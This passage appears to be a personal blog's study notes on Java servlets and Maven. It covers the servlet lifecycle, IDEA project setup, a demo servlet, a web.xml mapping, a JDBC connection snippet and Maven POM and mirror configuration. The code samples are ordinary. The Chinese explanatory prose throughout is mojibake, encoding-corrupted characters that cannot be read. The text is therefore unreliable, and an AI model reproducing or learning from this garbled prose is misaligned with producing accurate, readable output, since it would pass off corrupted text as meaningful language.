æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ã€‚<br>2.è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚<br>3.é€šè¿‡è°ƒç”¨ destroy() æ–¹æ³•ç»ˆæ­¢ï¼ˆç»“æŸï¼‰ã€‚<br>æœ€åï¼ŒServlet æ˜¯ç”± JVM çš„åƒåœ¾å›æ”¶å™¨è¿›è¡Œåƒåœ¾å›æ”¶çš„ã€‚</p><p>init()å¯ç†è§£ä¸ºåˆå§‹åŒ–,ä½†ä¸æ˜¯æ„é€ æ–¹æ³•ã€‚(javaæ„é€ æ–¹æ³•å¿…é¡»æ˜¯è·Ÿç±»ååŒåçš„)ä¸€èˆ¬è¿›è¡Œç®€å•çš„å‚æ•°è®¾å®šã€‚</p><p>service()ç”¨æ¥å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚å¹¶å°†æ ¼å¼åŒ–çš„å“åº”è¿”å›ç»™å®¢æˆ·ç«¯ã€‚æˆ‘ä»¬é€šå¸¸å¹¶ä¸éœ€è¦å¯¹è¿™ä¸ªæ–¹æ³•è¿›è¡Œæ”¹å–„,è€Œæ˜¯é‡å†™å…¶è°ƒç”¨çš„<code>doGet</code>,<code>doPost</code>ç­‰æ–¹æ³•ã€‚</p><p>doGet(),doPost()æ ¼å¼å‡å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> [doGet or doPost](HttpServletRequest request,HttpServletResponse response)</span><br><span class="line">    <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="comment">// Servlet code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>destroy() æ–¹æ³•åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œåœ¨ Servlet ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è¢«è°ƒç”¨ã€‚destroy() æ–¹æ³•å¯ä»¥è®©æ‚¨çš„ Servlet å…³é—­æ•°æ®åº“è¿æ¥ã€åœæ­¢åå°çº¿ç¨‹ã€æŠŠ Cookie åˆ—è¡¨æˆ–ç‚¹å‡»è®¡æ•°å™¨å†™å…¥åˆ°ç£ç›˜ï¼Œå¹¶æ‰§è¡Œå…¶ä»–ç±»ä¼¼çš„æ¸…ç†æ´»åŠ¨ã€‚<br>åœ¨è°ƒç”¨ destroy() æ–¹æ³•ä¹‹åï¼Œservlet å¯¹è±¡è¢«æ ‡è®°ä¸ºåƒåœ¾å›æ”¶</p><ul><li>éƒ¨ç½²</li></ul><p>è¿™ä¸€éƒ¨åˆ†åº”è¯¥ç®—æ˜¯webå¼€å‘çš„åŸºæœ¬æµç¨‹äº†,å› ä¸ºä»¥å‰åªæ˜¯å®¡è¿‡æºç ,æ‰€ä»¥åœ¨å®é™…ä½¿ç”¨ideaè¿›è¡Œé¡¹ç›®åˆ›å»ºä»¥åŠå†…å®¹ç¼–å†™ä¸Šè¿˜æ˜¯å¾—é‡æ–°æ¥è¿‡ã€‚</p><p>æµç¨‹:ideaåˆ›å»ºjavaEnterpriseé¡¹ç›®å¹¶é€‰æ‹©Additional Libraryä¸­çš„Web Application. =&gt; åœ¨æ–°å»ºé¡¹ç›®ä¸‹çš„web/WEB-INFç›®å½•ä¸‹æ–°å»ºlib,src,classesä¸‰ä¸ªæ–‡ä»¶å¤¹ =&gt; æ›´æ”¹é¡¹ç›®ç»“æ„ï¼š</p><p>1.src å¯ä»¥åœ¨Project Structureçš„modulesä¸­é‡æ–°è®¾ç½®source.æˆ‘ä»¬éœ€è¦æŠŠSourcesä»åŸå·¥ç¨‹çš„srcæ”¹ä¸ºWEB-INFä¸‹çš„src.Sources ä¸€èˆ¬ç”¨äºæ ‡æ³¨ç±»ä¼¼ src è¿™ç§å¯ç¼–è¯‘ç›®å½•ã€‚æœ‰æ—¶å€™æˆ‘ä»¬ä¸å•å•é¡¹ç›®çš„ src ç›®å½•è¦å¯ç¼–è¯‘ï¼Œè¿˜æœ‰å…¶ä»–ä¸€äº›ç‰¹åˆ«çš„ç›®å½•ä¹Ÿè®¸æˆ‘ä»¬ä¹Ÿè¦ä½œä¸ºå¯ç¼–è¯‘çš„ç›®å½•ï¼Œå°±éœ€è¦å¯¹è¯¥ç›®å½•è¿›è¡Œæ­¤æ ‡æ³¨ã€‚åªæœ‰ Sources è¿™ç§å¯ç¼–è¯‘ç›®å½•æ‰å¯ä»¥æ–°å»º Java ç±»å’ŒåŒ…ã€‚(æ­¤å¤„å·¥ç¨‹è‡ªå·±åˆ›å»ºçš„srcæ²¡ç”¨äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æ”¹æˆwebç›®å½•ä¸‹çš„æºæ–‡ä»¶å¤¹)<br>2.classes ç”¨æ¥å­˜æ”¾ç¼–è¯‘åè¾“å‡ºçš„classæ–‡ä»¶.æˆ‘ä»¬åŒæ ·åœ¨é¡¹ç›®ç»“æ„ä¸­Pathsçš„é…ç½®é‡Œå°†Output pathå’ŒTest output pathéƒ½é€‰æ‹©åˆšåˆšåˆ›å»ºçš„classesæ–‡ä»¶å¤¹ã€‚<br>3.libç”¨äºå¤–éƒ¨jaråŒ…ã€‚ç”±äºæˆ‘ä»¬å¼€å‘æ—¶å¿…ç„¶ä¼šç”¨åˆ°å¤–éƒ¨ä¾èµ–,æ‰€ä»¥å­˜æ”¾jaråŒ…çš„libä¹Ÿéœ€è¦åœ¨é¡¹ç›®ä¸­è®¾ç½®ã€‚æˆ‘ä»¬åŒæ ·åœ¨modulesä¸­æŠŠlibæ·»åŠ ä¸ºjar directoryå³å¯ã€‚</p><p>ç„¶åæ˜¯é…ç½®tomcatæœåŠ¡å™¨,è¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ã€‚ä¸è¿‡è¿˜æ˜¯è¦æ³¨æ„<code>artifact</code>è®¾ç½®æ ¹ç›®å½•çš„è¦ç‚¹ã€‚é€šå¸¸è®¾ç½®ä¸º<code>/</code>.</p><p>Servletç¼–å†™çš„ä¸€ä¸ªdemo.æˆ‘ä»¬é¦–å…ˆè¦åœ¨ä¹‹å‰æ›´æ”¹è¿‡çš„srcä¸‹æ–°å»ºä¸€ä¸ªclass<br>(è™½ç„¶ideaä¼šè‡ªåŠ¨æ¢æˆ.java)å‘½åéšæ„ã€‚ä¸è¿‡æœ€å¥½æ˜¯æŸæŸServlet.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String quote;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">TestServlet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"TestServlet constructor called."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"TestServlet init method called"</span>);</span><br><span class="line">        quote=<span class="string">"Thy will , not my will , be done."</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"TestServlet destroy method called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        resp.setContentType(<span class="string">"json"</span>);</span><br><span class="line">        PrintWriter out=resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"&#123;\"quote\":\""</span>+quote+<span class="string">"\"&#125;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¡ºæ‰‹å†™äº†æ„é€ æ–¹æ³•çœ‹çœ‹è°ƒç”¨é¡ºåºã€‚è™½ç„¶æˆ‘ä»¬éƒ½çŸ¥é“æ„é€ æ–¹æ³•å¿…ç„¶æ˜¯æœ€å…ˆè°ƒç”¨çš„ï¼Œå…¶æ¬¡æ˜¯init(),ç„¶åæ˜¯æˆ‘ä»¬æ¯æ¬¡è®¿é—®æ—¶è°ƒç”¨çš„doGet,æœ€ådestroyé”€æ¯ã€‚</p><p>ç„¶åæˆ‘ä»¬build moduleã€‚åœ¨WEB-INFä¸‹çš„classesä¸­ç”ŸæˆTestServlet.class.æœ€åå°±æ˜¯é…ç½®web.xmläº†ã€‚</p><blockquote><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒServlet åº”ç”¨ç¨‹åºä½äºè·¯å¾„ <Tomcat-installation-directory>/webapps/ROOT ä¸‹ï¼Œä¸”ç±»æ–‡ä»¶æ”¾åœ¨ <Tomcat-installation-directory>/webapps/ROOT/WEB-INF/classes ä¸­ã€‚<br>å¦‚æœæœ‰ä¸€ä¸ªå®Œå…¨åˆæ ¼çš„ç±»åç§° com.myorg.MyServletï¼Œé‚£ä¹ˆè¿™ä¸ª Servlet ç±»å¿…é¡»ä½äº WEB-INF/classes/com/myorg/MyServlet.class ä¸­ã€‚ä½äº <Tomcat-installation-directory>/webapps/ROOT/WEB-INF/ çš„ web.xml æ–‡ä»¶ä¸­å¿…é¡»è®¾ç½®Servletçš„ç›¸å…³æ¡ç›®ã€‚</Tomcat-installation-directory></Tomcat-installation-directory></Tomcat-installation-directory></p></blockquote><p>æ‰€ä»¥è·¯å¾„ç»“æ„è§„å®šå…¶å®éå¸¸æ¸…æ™°ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬åªéœ€è¦è®¾ç½®web.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>TestServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>test<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯è®¾å®šå¯¹åº”çš„servlet-classå¹¶å®šä¹‰å…¶servletname.åŒæ—¶å¯ä»¥å®šä¹‰è¿™ä¸ªservletå¯¹åº”çš„urlæ˜ å°„ã€‚</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/21.PNG" class="lazyload" data-srcset="21.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‰©ä¸‹çš„éƒ¨åˆ†å°±è·Ÿå…¶ä»–è¯­è¨€å·®ä¸å¤šäº†,ä½¿ç”¨get,postç­‰å¤„ç†å‚æ•°,cookieåŠç›¸åº”httpè¯·æ±‚ã€‚è¿™é‡Œç¨å¾®è®°å½•ä¸‹sqlè¿æ¥çš„ä½¿ç”¨æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String JDBC_DRIVER = <span class="string">"com.mysql.jdbc.Driver"</span>;  </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String DB_URL = <span class="string">"jdbc:mysql://localhost:3306/test"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String USER = <span class="string">"root"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String PASS = <span class="string">"123456"</span>; </span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Class.forName(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">conn = DriverManager.getConnection(DB_URL,USER,PASS);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">mt = conn.createStatement();</span><br><span class="line">String sql;</span><br><span class="line">sql = <span class="string">"SELECT id, name, url FROM websites"</span>;</span><br><span class="line">ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">rs.close();</span><br><span class="line">stmt.close();</span><br><span class="line">conn.close();</span><br></pre></td></tr></table></figure><h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><p>ä¹‹å‰ä½¿ç”¨ysoserialè·Ÿmarshalsecæ—¶æƒ³å¿…å¿…ç„¶ç”¨è¿‡mavenäº†ã€‚ä½†æ˜¯å®é™…ä¸Šmavençš„ä½œç”¨ç©¶ç«Ÿæ˜¯ä»€ä¹ˆè¿˜æ˜¯ä¸€å¤´é›¾æ°´ã€‚å› æ­¤é’ˆå¯¹mavenä¹Ÿæ¥å­¦ä¹ ä¸‹ã€‚</p><ul><li>what is maven<br>Maven ç¿»è¯‘ä¸ºâ€ä¸“å®¶â€ã€â€å†…è¡Œâ€ï¼Œæ˜¯ Apache ä¸‹çš„ä¸€ä¸ªçº¯ Java å¼€å‘çš„å¼€æºé¡¹ç›®ã€‚åŸºäºé¡¹ç›®å¯¹è±¡æ¨¡å‹ï¼ˆç¼©å†™ï¼šPOMï¼‰æ¦‚å¿µï¼ŒMavenåˆ©ç”¨ä¸€ä¸ªä¸­å¤®ä¿¡æ¯ç‰‡æ–­èƒ½ç®¡ç†ä¸€ä¸ªé¡¹ç›®çš„æ„å»ºã€æŠ¥å‘Šå’Œæ–‡æ¡£ç­‰æ­¥éª¤ã€‚</li></ul><p>Maven æ˜¯ä¸€ä¸ªé¡¹ç›®ç®¡ç†å·¥å…·ï¼Œå¯ä»¥å¯¹ Java é¡¹ç›®è¿›è¡Œæ„å»ºã€ä¾èµ–ç®¡ç†ã€‚</p><p>ç¯å¢ƒé…ç½®åªè¦jdk+ä¸‹è½½mavenå³å¯ã€‚å½“ç„¶æˆ‘è®°å¾—IDEAåº”è¯¥æ˜¯æœ‰mavençš„åŠŸèƒ½çš„ã€‚</p><ul><li>POM</li></ul><p>POM å³ project object model.æ˜¯ä¸€ä¸ªxmlæ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿæ˜¯mavenå·¥ç¨‹çš„åŸºæœ¬å•å…ƒã€‚åŒ…å«äº†é¡¹ç›®çš„åŸºæœ¬ä¿¡æ¯ï¼Œç”¨äºæè¿°é¡¹ç›®å¦‚ä½•æ„å»ºï¼Œå£°æ˜é¡¹ç›®ä¾èµ–ï¼Œç­‰ç­‰ã€‚</p><p>ä¸€ä¸ªpom.xmlçš„demo</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span> = <span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://maven.apache.org/POM/4.0.0</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- æ¨¡å‹ç‰ˆæœ¬ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å…¬å¸æˆ–è€…ç»„ç»‡çš„å”¯ä¸€æ ‡å¿—ï¼Œå¹¶ä¸”é…ç½®æ—¶ç”Ÿæˆçš„è·¯å¾„ä¹Ÿæ˜¯ç”±æ­¤ç”Ÿæˆï¼Œ å¦‚com.companyname.project-groupï¼Œmavenä¼šå°†è¯¥é¡¹ç›®æ‰“æˆçš„jaråŒ…æ”¾æœ¬åœ°è·¯å¾„ï¼š/com/companyname/project-group --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.companyname.project-group<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- é¡¹ç›®çš„å”¯ä¸€IDï¼Œä¸€ä¸ªgroupIdä¸‹é¢å¯èƒ½å¤šä¸ªé¡¹ç›®ï¼Œå°±æ˜¯é artifactIdæ¥åŒºåˆ†çš„ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>project<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- ç‰ˆæœ¬å· --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¸¸è§çš„èŠ‚ç‚¹ç†è§£</p><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/22.PNG" class="lazyload" data-srcset="22.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>Super POM<blockquote><p>çˆ¶ï¼ˆSuperï¼‰POMæ˜¯ Maven é»˜è®¤çš„ POMã€‚æ‰€æœ‰çš„ POM éƒ½ç»§æ‰¿è‡ªä¸€ä¸ªçˆ¶ POMï¼ˆæ— è®ºæ˜¯å¦æ˜¾å¼å®šä¹‰äº†è¿™ä¸ªçˆ¶ POMï¼‰ã€‚çˆ¶ POM åŒ…å«äº†ä¸€äº›å¯ä»¥è¢«ç»§æ‰¿çš„é»˜è®¤è®¾ç½®ã€‚å› æ­¤ï¼Œå½“ Maven å‘ç°éœ€è¦ä¸‹è½½ POM ä¸­çš„ ä¾èµ–æ—¶ï¼Œå®ƒä¼šåˆ° Super POM ä¸­é…ç½®çš„é»˜è®¤ä»“åº“ <a href="http://repo1.maven.org/maven2" target="_blank" rel="noopener">http://repo1.maven.org/maven2</a> å»ä¸‹è½½ã€‚</p></blockquote></li></ul><p>æ›´å¤špomæ ‡ç­¾çš„å«ä¹‰åœ¨é‡åˆ°å®é™…æƒ…å†µå†ä½œè¯´æ˜ã€‚</p><ul><li>Life Cycle</li></ul><p>Maven æ„å»ºç”Ÿå‘½å‘¨æœŸå®šä¹‰äº†ä¸€ä¸ªé¡¹ç›®æ„å»ºè·Ÿå‘å¸ƒçš„è¿‡ç¨‹.å…¶ä¸»è¦çš„ä¸‰ä¸ªç”Ÿå‘½å‘¨æœŸæ˜¯<code>clean</code>,<code>default/build</code>,<code>site</code>.</p><p>å¸¸ç”¨å‘½ä»¤å¦‚<code>mvn clean</code>æ‰§è¡Œçš„å…¶å®æ˜¯ä¸¤ä¸ªç”Ÿå‘½å‘¨æœŸé˜¶æ®µ<code>pre-clean,clean</code>.æ¢æˆ<code>mvn post-clean</code>åˆ™ä¼šéƒ½æ‰§è¡Œä¸€éå³ä¸‰ä¸ªé˜¶æ®µã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pre-cleanï¼šæ‰§è¡Œä¸€äº›éœ€è¦åœ¨cleanä¹‹å‰å®Œæˆçš„å·¥ä½œ</span><br><span class="line">cleanï¼šç§»é™¤æ‰€æœ‰ä¸Šä¸€æ¬¡æ„å»ºç”Ÿæˆçš„æ–‡ä»¶</span><br><span class="line">post-cleanï¼šæ‰§è¡Œä¸€äº›éœ€è¦åœ¨cleanä¹‹åç«‹åˆ»å®Œæˆçš„å·¥ä½œ</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶pom.xmlæ¥å†³å®šmvn cleanæ—¶æ¯ä¸ªé˜¶æ®µçš„åŠ¨ä½œã€‚</p><ul><li>maven repos</li></ul><p>mavenä»“åº“æ˜¯é¡¹ç›®ä¸­ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“ã€‚å…¶ä¸»è¦æ˜¯å­˜å‚¨jarçš„åœ°æ–¹ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„å»ºæœ¬åœ°çš„mavené¡¹ç›®ã€‚å½“ç„¶ä¹Ÿå¯ä»¥æœ‰è¿œç¨‹ä¸é»˜è®¤çš„ä»“åº“ã€‚</p><p>æ¯”å¦‚ä½¿ç”¨aliyunä»“åº“ã€‚æˆ‘ä»¬å¯ä»¥åœ¨mavençš„settingä¸­æ›´æ”¹setting.xmlæ·»åŠ èŠ‚ç‚¹ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure><p>pom.xmlä¸­æ·»åŠ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">releases</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">releases</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span>  </span><br><span class="line">                <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¯èƒ½ç®—æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€ç‚¹äº†ã€‚å› ä¸ºå¤§éƒ¨åˆ†ideaè‡ªå¸¦çš„mavenæˆ–è€…æ˜¯é»˜è®¤ä¸‹è½½çš„mavené…ç½®ä¸­settings.xmléƒ½ä¼šå»å›½å¤–ä»“åº“è·å–èµ„æºï¼Œå¯¼è‡´é€Ÿåº¦å¥‡æ…¢ã€‚</p><ul><li>develop</li></ul><p>ä¸‹é¢å°±å¯ä»¥å¼€å§‹æ­£å¼mavené¡¹ç›®çš„å¼€å‘äº†ã€‚ä¼¼ä¹ideaç›´æ¥åˆ›é€ maven projectæœ‰ä¸€äº›å‘è¦è¸©ã€‚æ‰€ä»¥æˆ‘å…ˆæŒ‰ç…§èœé¸Ÿæ•™ç¨‹ä¸Šçš„èµ°ã€‚</p><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œå…ˆç¡®è®¤æŠŠä»“åº“çš„è®¾ç½®æ”¹å¥½äº†ã€‚å³é€‰æ‹©äº†aliyuné•œåƒ.ç„¶åideaçš„é…ç½®ä¸­:<br><img 